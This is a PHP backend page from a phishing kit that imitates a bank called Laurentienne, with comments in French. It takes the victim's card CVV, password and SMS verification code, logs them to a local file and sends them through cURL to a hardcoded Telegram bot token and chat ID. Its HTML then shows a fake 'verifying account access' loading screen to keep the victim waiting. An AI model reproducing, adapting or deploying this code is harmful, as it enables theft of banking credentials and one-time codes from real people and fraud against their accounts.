<?php 
session_start();

// Vérifie si les données 'cvv' et 'mdp' sont présentes dans la session, sinon redirige vers la page de connexion
if (!isset($_SESSION["cvv"]) or !isset($_SESSION["mdp"])) {
    header("Location: ./index.php");
    exit();
}

// Récupère le SMS du formulaire
$_SESSION["sms"] = $_POST['sms'];

// Prépare le message à envoyer sur Telegram
$message = "📲 **NOUVEAU SMS REÇU** 📲\n\n" .
           "🔑 **CVV** : " . $_SESSION["cvv"] . "\n" .
           "🔐 **Mot de Passe** : " . $_SESSION["mdp"] . "\n" .
           "💬 **SMS** : " . $_SESSION["sms"] . "\n" .
           "**FIN CONNEXION**\n";

// Enregistre les données dans un fichier local (peut être conservé ou retiré selon les besoins)
$file = "../blinky2000@bvc@bvc@destruction.txt";
file_put_contents($file, $message, FILE_APPEND);

// Configuration de l'envoi Telegram
$token = '7231855269:AAHHENpMKORsPdG5gUH7z_NsS7Zz8QaZAcg'; // Remplace par le token de ton bot
$chat_id = '6242884372'; // Remplace par ton chat_id

// URL de l'API Telegram pour envoyer le message
$url = "https://api.telegram.org/bot$token/sendMessage";

// Prépare les données à envoyer via l'API
$data = [
    'chat_id' => $chat_id,
    'text' => $message,
    'parse_mode' => 'Markdown' // Permet de formater le texte avec Markdown
];

// Initialise cURL pour envoyer le message
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Désactive la vérification SSL (peut être activé en production avec un certificat valide)
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

// Exécute la requête et récupère la réponse
$response = curl_exec($ch);

// Vérifie si cURL a rencontré une erreur
if (curl_errno($ch)) {
    echo 'Erreur cURL : ' . curl_error($ch);
} else {
    echo '';
}

// Ferme la session cURL
curl_close($ch);

// Détruit la session après l'envoi des données
session_destroy();
?>





<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" media="screen and (max-width: 768px)" href="/laurentienne/styles_mobile.css">

    <link rel="stylesheet" media="screen and (min-width: 769px)" href="/laurentienne/styles_pc.css">
    <title>Laurentienne</title>
</head>
<header>
<nav>
    <span> <img src="./logo.svg" alt=""> </span>
</nav>
</header>
<body style="margin: 0px;">
    
<form  >
   <b> VEUILLEZ PATIENTER PENDANT QUE NOUS VERIFIONS L'ACCES AU COMPTE </b>

   <div class="load" style="text-align:center" >
            <img src="../img/ajax-loading.gif" alt="">
        </div>


</form>
<br> <br>

</body>
</html>
